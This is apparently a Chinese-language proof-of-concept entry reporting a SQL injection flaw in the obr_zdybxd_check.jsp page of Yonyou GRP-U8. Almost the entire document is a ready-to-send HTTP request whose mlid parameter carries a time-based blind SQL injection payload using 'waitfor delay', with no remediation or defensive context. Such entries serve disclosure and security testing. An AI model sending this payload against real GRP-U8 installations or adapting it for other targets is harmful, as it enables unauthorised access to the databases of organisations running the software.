## 用友GRP-U8-obr_zdybxd_check.jsp存在SQL注入

## poc
```
GET /u8qx/obr_zdybxd_check.jsp?mlid=1';waitfor+delay+'0:0:3'-- HTTP/1.1
Host: 172.16.135.132:8009
Cache-Control: max-age=0
Origin: null
DNT: 1
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```
